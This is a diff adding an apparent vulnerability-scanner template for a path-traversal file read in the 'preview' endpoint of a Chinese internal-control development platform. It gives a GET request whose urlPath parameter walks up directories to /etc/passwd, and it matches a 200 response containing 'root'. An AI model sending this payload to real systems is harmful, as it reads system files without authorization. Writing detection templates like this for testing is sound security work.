@@ -1,0 +1,17 @@
+id:
+
+info:
+  name: 真内控国产化开发平台 preview 任意文件读取
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /print/billPdf/preview?urlPath=../../../../../../../../../../../../../../etc/passwd
+response1:
+  headers:
+  body: root
+  code: 200
+requests2:
+response2:
